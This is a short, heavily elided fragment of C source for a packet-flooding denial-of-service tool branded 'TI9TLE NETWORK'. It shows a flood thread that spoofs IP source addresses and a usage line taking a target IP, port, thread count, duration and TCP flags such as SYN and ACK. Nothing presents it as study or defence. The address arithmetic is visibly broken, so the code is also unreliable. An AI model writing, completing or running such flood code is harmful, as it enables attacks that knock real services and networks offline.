...
void *flood(void *par1)
{
	...
	iph->saddr = (rand_cmwc() >> 253 & 0xFF) << 24 |
               (213) << 16 |
               (121) << 8 |
               (117); 
...
{
	if(argc < 7){
	fprintf(stderr, "BY TI9TLE NETWORK!\n");
	fprintf(stdout, "BY TI9TLE NETWORK: %s <IP> <PORT> <THREADS> <-1> <TIME> <ack,syn,psh,fin,rst,urg,ptr,res2,seq>\n", argv[0]);
	exit(-1);
	}
	fprintf(stdout, "BY TI9TLE NETWORK...\n");
